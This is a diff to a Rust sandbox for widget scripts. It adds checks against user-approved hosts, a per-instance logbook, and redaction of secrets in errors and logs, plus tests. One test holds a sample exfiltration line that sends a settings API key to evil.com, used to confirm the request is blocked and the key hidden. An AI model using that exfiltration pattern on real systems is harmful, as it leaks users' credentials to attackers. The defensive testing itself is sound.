@@ -20,7 +20,9 @@ use serde::{Deserialize, Serialize};
 use serde_json::{Map, Value};
 
 use crate::display::Output;
-use crate::manifest::Manifest;
+use crate::logbook::LogBook;
+use crate::manifest::{Manifest, Permissions};
+use crate::secrets::Redactor;
 
 /// Wall-time and JS heap limits for one run.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -73,6 +75,13 @@ pub struct RunContext {
     /// Per-instance storage file (`paths::storage_file(&instance_id)`).
     pub storage_path: PathBuf,
     pub limits: Limits,
+    /// The permissions the user approved. URLs are checked against these,
+    /// never against what the manifest declares.
+    pub permissions: Permissions,
+    /// Widget log lines are also kept here, under `instance_id`.
+    pub logbook: LogBook,
+    /// Replaces the instance's secret values in widget log lines.
+    pub redactor: Arc<Redactor>,
 }
 
 #[derive(Debug, thiserror::Error)]
@@ -105,9 +114,11 @@ pub const WIDGET_LOG_TARGET: &str = "perchbar::widget";
 
 /// Cuts an error message to `ERROR_MAX_CHARS` characters, the last one an
 /// ellipsis, and blanks control characters, so a widget cannot flood or
-/// forge log lines or tooltips.
-fn clip(msg: impl Into<String>) -> String {
-    let msg = host::without_controls(&msg.into());
+/// forge log lines or tooltips. Secret values are replaced first, so the cut
+/// can never leave part of one, and again after blanking, in case that
+/// formed one.
+fn clip(redactor: &Redactor, msg: impl Into<String>) -> String {
+    let msg = redactor.apply(&host::without_controls(&redactor.apply(&msg.into())));
     if msg.chars().count() <= ERROR_MAX_CHARS {
         return msg;
     }
@@ -119,8 +130,9 @@ fn clip(msg: impl Into<String>) -> String {
 /// Runs `widget.js` once in a fresh runtime and returns its parsed output.
 /// Storage changes are saved even when the run fails or times out.
 pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
-    let source = std::fs::read_to_string(ctx.widget_dir.join("widget.js"))
-        .map_err(|e| RunError::Script(clip(format!("cannot read widget.js: {e}"))))?;
+    let source = crate::manifest::read_script(&ctx.widget_dir).map_err(|e| {
+        RunError::Script(clip(&ctx.redactor, format!("cannot read widget.js: {e}")))
+    })?;
     let storage = Arc::new(Mutex::new(host::Storage::load(ctx.storage_path.clone())));
     let limits = ctx.limits;
     let violation = Arc::new(Mutex::new(None));
@@ -141,8 +153,12 @@ pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
         return Err(RunError::Script("output too large".into()));
     }
     let value: Value =
-        serde_json::from_str(&json).map_err(|e| RunError::BadOutput(clip(e.to_string())))?;
-    crate::display::parse(value).map_err(|e| RunError::BadOutput(clip(e.to_string())))
+        serde_json::from_str(&json).map_err(|e| bad_output(&ctx.redactor, e.to_string()))?;
+    crate::display::parse(value).map_err(|e| bad_output(&ctx.redactor, e.to_string()))
+}
+
+fn bad_output(redactor: &Redactor, msg: String) -> RunError {
+    RunError::BadOutput(clip(redactor, msg))
 }
 
 /// Evaluates the prelude and widget in a fresh runtime + context; returns the
@@ -153,7 +169,7 @@ async fn execute(
     storage: Arc<Mutex<host::Storage>>,
     violation: Violation,
 ) -> Result<Option<String>, RunError> {
-    let script_err = |e: rquickjs::Error| RunError::Script(clip(e.to_string()));
+    let script_err = |e: rquickjs::Error| RunError::Script(clip(&ctx.redactor, e.to_string()));
     let rt = AsyncRuntime::new().map_err(script_err)?;
     rt.set_memory_limit(ctx.limits.memory_bytes).await;
     let interrupted = Arc::new(AtomicBool::new(false));
@@ -171,13 +187,15 @@ async fn execute(
 
     let instance_id = ctx.instance_id.clone();
     let http = ctx.http.clone();
-    let allowed = ctx.manifest.permissions.network.clone();
+    let allowed = ctx.permissions.network.clone();
+    let logbook = ctx.logbook.clone();
+    let redactor = ctx.redactor.clone();
     let seen = violation.clone();
     let settings = Value::Object(ctx.settings.clone()).to_string();
     js.async_with(async move |ctx| {
         let result: rquickjs::Result<Option<String>> = async {
-            host::install(&ctx, storage, instance_id)?;
-            install_fetch(&ctx, http, allowed, seen)?;
+            install_fetch(&ctx, http, allowed, seen, redactor.clone())?;
+            host::install(&ctx, storage, instance_id, logbook, redactor.clone())?;
             let invoke: Function = ctx.eval(PRELUDE)?;
             let (module, loaded) = Module::declare(ctx.clone(), "widget.js", source)?.eval()?;
             loaded.into_future::<()>().await?;
@@ -186,7 +204,7 @@ async fn execute(
             pending.into_future::<Option<String>>().await
         }
         .await;
-        result.map_err(|e| classify(&ctx, e, &interrupted, &violation))
+        result.map_err(|e| classify(&ctx, e, &interrupted, &violation, &redactor))
     })
     .await
 }
@@ -197,11 +215,12 @@ fn classify(
     err: rquickjs::Error,
     interrupted: &AtomicBool,
     violation: &Violation,
+    redactor: &Redactor,
 ) -> RunError {
     if matches!(err, rquickjs::Error::Allocation) {
         return RunError::OutOfMemory;
     }
-    let message = CaughtError::from_error(ctx, err).to_string();
+    let message = redactor.apply(&CaughtError::from_error(ctx, err).to_string());
     if interrupted.load(Ordering::Relaxed) {
         RunError::Timeout
     } else if message.contains("out of memory") {
@@ -212,9 +231,9 @@ fn classify(
         .as_ref()
         .filter(|v| message.contains(*v))
     {
-        RunError::Permission(clip(v.clone()))
+        RunError::Permission(clip(redactor, v.clone()))
     } else {
-        RunError::Script(clip(message))
+        RunError::Script(clip(redactor, message))
     }
 }
 
@@ -228,6 +247,7 @@ fn install_fetch<'js>(
     http: Arc<dyn HttpClient>,
     allowed: Vec<String>,
     violation: Violation,
+    redactor: Arc<Redactor>,
 ) -> rquickjs::Result<()> {
     // Per run (each run installs fetch into a fresh context): a cap on
     // requests in flight and on the total response bytes.
@@ -239,6 +259,7 @@ fn install_fetch<'js>(
             let http = http.clone();
             let allowed = allowed.clone();
             let violation = violation.clone();
+            let redactor = redactor.clone();
             let in_flight = in_flight.clone();
             let received = received.clone();
             async move {
@@ -260,6 +281,9 @@ fn install_fetch<'js>(
                 let resp = match send(http.as_ref(), req, &allowed).await {
                     Ok(resp) => resp,
                     Err(SendError::Denied(msg)) => {
+                        // The URL may hold a secret: hide it before the
+                        // message is logged, stored or thrown.
+                        let msg = redactor.apply(&msg);
                         log::warn!("blocked widget request: {msg}");
                         *violation.lock().unwrap() = Some(msg.clone());
                         return Err(Exception::throw_type(&ctx, &msg));
@@ -335,7 +359,11 @@ mod tests {
         limits: Limits,
         http_body: String,
         network: Vec<String>,
+        /// Approved hosts; `None` approves exactly what the manifest declares.
+        approved: Option<Vec<String>>,
+        logbook: LogBook,
         http: Option<Arc<dyn HttpClient>>,
+        redactor: Arc<Redactor>,
     }
 
     /// An HTTP client whose requests never complete.
@@ -357,7 +385,10 @@ mod tests {
                 limits: Limits::default(),
                 http_body: "{}".into(),
                 network: Vec::new(),
+                approved: None,
+                logbook: LogBook::default(),
                 http: None,
+                redactor: Arc::default(),
             }
         }
 
@@ -385,6 +416,12 @@ mod tests {
                 }),
                 storage_path: self.storage_path(),
                 limits: self.limits,
+                permissions: Permissions {
+                    network: self.approved.clone().unwrap_or(self.network.clone()),
+                    ..Permissions::default()
+                },
+                logbook: self.logbook.clone(),
+                redactor: self.redactor.clone(),
             }
         }
 
@@ -423,6 +460,35 @@ mod tests {
         );
         let out = f.run().await.unwrap();
         assert_eq!(text(&out), "hi");
+    }
+
+    #[tokio::test]
+    async fn oversized_or_linked_script_is_a_run_error() {
+        let big = format!(
+            "{}\n{}",
+            " ".repeat(crate::manifest::SCRIPT_MAX_BYTES as usize),
+            returning("1")
+        );
+        let f = Fixture::new(&big);
+        match f.run().await {
+            Err(RunError::Script(m)) => assert!(m.contains("larger"), "{m}"),
+            other => panic!("expected a script error, got {other:?}"),
+        }
+
+        // A link to a script elsewhere is refused. Creating links needs a
+        // privilege on Windows; without it only the size case is checked.
+        let f = Fixture::new(&returning("1"));
+        let outside = tempfile::tempdir().unwrap();
+        let target = outside.path().join("real.js");
+        std::fs::write(&target, returning("\"outside\"")).unwrap();
+        let link = f.dir.path().join("widget.js");
+        std::fs::remove_file(&link).unwrap();
+        if std::os::windows::fs::symlink_file(&target, &link).is_ok() {
+            match f.run().await {
+                Err(RunError::Script(m)) => assert!(m.contains("link"), "{m}"),
+                other => panic!("expected a script error, got {other:?}"),
+            }
+        }
     }
 
     #[tokio::test]
@@ -644,6 +710,127 @@ mod tests {
             "(() => { console.log(\"a\", 1, { b: 2 }); log(\"c\"); return \"logged\"; })()",
         ));
         assert_eq!(text(&f.run().await.unwrap()), "logged");
+        let lines: Vec<String> = f
+            .logbook
+            .lines("inst-1")
+            .into_iter()
+            .map(|l| {
+                assert_eq!(l.level, crate::logbook::LogLevel::Info);
+                l.text
+            })
+            .collect();
+        assert_eq!(lines, vec!["a 1 {\"b\":2}", "c"]);
+    }
+
+    #[tokio::test]
+    async fn console_levels_reach_the_logbook() {
+        use crate::logbook::LogLevel;
+        let f = Fixture::new(&returning(
+            "(() => { console.info(\"i\"); console.warn(\"w\"); console.error(\"e\"); return 1; })()",
+        ));
+        f.run().await.unwrap();
+        let got: Vec<(LogLevel, String)> = f
+            .logbook
+            .lines("inst-1")
+            .into_iter()
+            .map(|l| (l.level, l.text))
+            .collect();
+        assert_eq!(
+            got,
+            vec![
+                (LogLevel::Info, "i".to_string()),
+                (LogLevel::Warn, "w".to_string()),
+                (LogLevel::Error, "e".to_string()),
+            ]
+        );
+    }
+
+    #[tokio::test]
+    async fn run_errors_are_redacted_before_the_clip() {
+        const SECRET: &str = "sk-1234567890";
+        let mut straddled = false;
+        // Slide the secret across the 300-char cut.
+        for pad in 280..300 {
+            let mut f = Fixture::new(&format!(
+                "export default async function update({{ settings }}) {{\n\
+                 throw new Error(\"x\".repeat({pad}) + settings.apiKey);\n}}"
+            ));
+            f.settings.insert("apiKey".into(), json!(SECRET));
+            f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
+            let m = match f.run().await {
+                Err(RunError::Script(m)) => m,
+                other => panic!("expected a script error, got {other:?}"),
+            };
+            assert!(!m.contains(&SECRET[..4]), "pad {pad}: {m}");
+            straddled |= m.contains("[sec") && !m.contains("[secret]");
+        }
+        assert!(straddled, "no offset put the secret across the cut");
+    }
+
+    #[tokio::test]
+    async fn bad_output_and_violations_are_redacted() {
+        const SECRET: &str = "sk-1234567890";
+        let mut f = Fixture::new(
+            "export default async function update({ settings }) {\n\
+             return { blocks: [{ type: settings.apiKey }] };\n}",
+        );
+        f.settings.insert("apiKey".into(), json!(SECRET));
+        f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
+        match f.run().await {
+            Err(RunError::BadOutput(m)) => assert!(!m.contains(&SECRET[..4]), "{m}"),
+            other => panic!("expected bad output, got {other:?}"),
+        }
+
+        let mut f = Fixture::new(
+            "export default async function update({ settings }) {\n\
+             await fetch(\"https://evil.com/?k=\" + settings.apiKey);\n}",
+        );
+        f.settings.insert("apiKey".into(), json!(SECRET));
+        f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
+        match f.run().await {
+            Err(RunError::Permission(m)) => {
+                assert!(!m.contains(&SECRET[..4]), "{m}");
+                assert!(m.contains("evil.com"), "{m}");
+            }
+            other => panic!("expected a permission error, got {other:?}"),
+        }
+    }
+
+    #[tokio::test]
+    async fn widget_log_lines_are_redacted() {
+        let mut f = Fixture::new(&returning(
+            "(() => { log(\"key=\" + settings.apiKey + \"\\n\" + \"x\".repeat(1009) + settings.apiKey); return 1; })()",
+        ));
+        f.settings.insert("apiKey".into(), json!("sk-12345"));
+        f.redactor = Arc::new(Redactor::new(["sk-12345".to_string()]));
+        f.run().await.unwrap();
+        let lines = f.logbook.lines("inst-1");
+        assert_eq!(lines.len(), 1);
+        assert!(
+            lines[0].text.starts_with("key=[secret] "),
+            "{}",
+            lines[0].text
+        );
+        // The second copy straddles the 1,024-byte cut: redacted first, so
+        // no fragment of the secret survives the cut.
+        assert_eq!(lines[0].text.len(), 1024);
+        assert!(lines[0].text.ends_with("x[s"), "{}", lines[0].text);
+    }
+
+    #[tokio::test]
+    async fn fetch_checks_approved_hosts_not_the_manifest() {
+        let mut f = Fixture::new(&format!(
+            "export default async function update() {{ {UNDECLARED_FETCH}; return {{ blocks: [] }}; }}"
+        ));
+        // Declared in the manifest, but the user approved nothing.
+        f.network = vec!["evil.com".into()];
+        f.approved = Some(Vec::new());
+        match f.run().await {
+            Err(RunError::Permission(m)) => {
+                assert!(m.contains("host not allowed: evil.com"), "{m}")
+            }
+            other => panic!("expected Permission error, got {other:?}"),
+        }
     }
 
     /// Keeps every log record of the test binary as (target, level, text).
